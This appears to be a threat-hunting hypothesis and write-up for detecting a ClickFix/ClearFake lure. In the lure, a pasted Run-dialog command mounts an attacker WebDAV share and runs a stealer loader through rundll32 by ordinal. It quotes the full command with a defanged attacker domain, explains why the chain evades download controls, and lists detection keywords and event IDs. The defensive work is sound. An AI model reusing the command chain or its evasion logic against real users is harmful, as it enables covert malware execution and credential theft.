hypothesis: >-
  A ClickFix-style lure convinces a user to paste a prepared command into the Run dialog or a terminal.
  The command is a three-part chain — `pushd \\<host>\<path>\<victim_id> && rundll32.exe <file> #1 &&
  popd` — that mounts an attacker WebDAV share as a drive, executes a payload straight from it by
  ORDINAL, and unmounts. Three properties make this evade the usual controls at once: nothing is ever
  downloaded to disk by a browser, so download-reputation and mark-of-the-web checks never engage; the
  payload carries a non-DLL extension (`pf.ch`), so extension-based rules and many file-write
  detections miss it; and execution is proxied through signed, in-box `rundll32.exe` invoked by ordinal
  `#1` rather than by an exported function name, which defeats rules keyed on known export names. The
  invariant is the shape: a `rundll32` command line containing a UNC path, with the WebClient service
  starting on a host that has no WebDAV business, moments after an interactive paste.

false_positive_notes: |
  Each condition in this chain has a benign population, which is why the hunt is built on their intersection rather than on any one of them. `rundll32.exe` runs constantly on Windows for entirely legitimate reasons, so the discriminator is never `rundll32` alone — it is `rundll32` whose command line contains a UNC path (` \\`), which is genuinely rare. Some enterprise software and login scripts do invoke DLLs from SMB shares, and those are the main recurring benign matches; they are stable, they point at internal file servers in your own namespace, and they can be enumerated once and allowlisted by destination host. Ordinal invocation (`#1`) is rarer still and legitimate uses are mostly confined to a handful of in-box shell operations. The `WebClient` service is the sharpest discriminator of the three: it is set to manual start and, in the great majority of enterprises, never starts at all, so a WebClient start on a workstation is close to self-evidently interesting — but be aware that environments genuinely using SharePoint/OneDrive mapped drives or WebDAV-based document management will start it routinely, and in those the service start must be dropped from the filter and replaced by destination scoping (internal SharePoint host versus arbitrary external domain). The `pushd` to a UNC path also appears in legitimate administrative scripting, again overwhelmingly to internal hosts. In practice, filtering to an EXTERNAL destination host removes nearly all benign volume in one step, because legitimate WebDAV and UNC use is almost entirely internal. Finally, `RunMRU` entries have an obvious benign population — administrators type `cmd`, `mmc`, `\\server\share` — and the value there is not novelty but content: a long multi-command chain containing `rundll32` in a user's Run history is not something a person composes by hand.

A second observed build used the filename `verification.google` with named export `CfgInspectModuleData`; the `pf.ch` build exported `moor`. Hunt the SHAPE, not these names.
  Core filter, the WebClient service - System event 7045 or an SCM state change starting the `WebClient` service, correlated to the same host within minutes of the `rundll32` execution. WebDAV mounting requires WebClient, it is manual-start by default, and in most enterprises it never runs - so in a non-SharePoint environment this single event is a strong standalone lead. Where the environment does use WebDAV legitimately, drop this condition and scope on destination instead.
  Core filter, the paste - Sysmon Event ID 13 on `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`. ClickFix depends on the victim pasting into the Run dialog, and RunMRU preserves exactly what was pasted, which is often the only surviving record of the lure. A RunMRU value containing `&&`, `powershell`, `rundll32`, `mshta`, `curl` or a UNC path is the artefact. This is also the pivot that proves USER EXECUTION rather than exploitation, which changes the incident's scope and the remediation conversation.
  Network correlation - Sysmon Event ID 3 from `rundll32.exe` or `svchost.exe` (WebClient runs under svchost) to an external host on 80/443, and Sysmon Event ID 22 DNS queries showing RANDOMISED SUBDOMAINS under a single registrable parent - reported infrastructure used a per-victim random subdomain of `leaguejazire[.]com`. Where proxy logs are available, WebDAV mounting emits `OPTIONS` and `PROPFIND` verbs, which are rare enough in ordinary browsing to be worth their own standing query. The macOS branch of the same campaign used `curl` with a distinctive user agent to a subdomain of `riyazinikokar[.]xyz`.

# H313

Cisco Talos documented a ClearFake chain that reaches code execution without a single browser download. Compromised sites serve JavaScript through a malicious Cloudflare Worker; the script reads its next stage from a BNB Smart Chain contract, branches on operating system, and presents a fake Google CAPTCHA that instructs the victim to paste a command. On Windows that command is `pushd \\leaguejazire[.]com\<random>\<victim_id> && rundll32.exe pf.ch #1 && popd` — mount an attacker WebDAV share, run the payload from it by ordinal, unmount. Three evasions are stacked into one line: no file is downloaded by the browser, so mark-of-the-web and download reputation never apply; the payload is a DLL named `pf.ch`, so extension-keyed rules do not match; and execution is proxied through signed in-box `rundll32.exe` using ordinal `#1` rather than a named export, defeating rules that look for known export strings. The loader unpacks Amatera stealer entirely in memory, resolving its C2 from a Telegraph dead-drop page.

## Why

- **The intersection is rare even though every element is individually common.** `rundll32` is ubiquitous, UNC paths are ordinary, and users paste things constantly — but `rundll32` with a UNC path in its arguments, pointing at an *external* host, is close to nonexistent in legitimate enterprise activity. Building the hunt on the intersection rather than on any single element is what keeps it operational at scale.
- **WebDAV execution routes around the download-inspection pipeline entirely.** Most endpoint and email controls are positioned around files arriving through a browser or mail client, where mark-of-the-web, SmartScreen and download reputation all engage. A WebDAV mount delivers the payload as a file on a *mapped drive*, which none of that machinery evaluates — so the technique's whole value is bypassing controls that will report nothing.
- **The WebClient service is a near-binary indicator in most estates.** It is manual-start, it exists only to support WebDAV, and outside SharePoint-mapped-drive shops it simply never runs. Where that holds, a single service-start event is a high-confidence lead; where it does not hold, the environment knows it does not hold, and destination scoping substitutes cleanly. Either way the answer is knowable in advance rather than discovered during triage.
- **RunMRU converts an ambiguous execution into a proven social-engineering incident.** The pasted command survives in the user's Run history, which is frequently the only remaining evidence of the lure after the WebDAV share goes offline. That artefact settles whether this was exploitation or user execution — a distinction that determines scope, user-communication and remediation, and one that is otherwise very hard to establish after the fact.
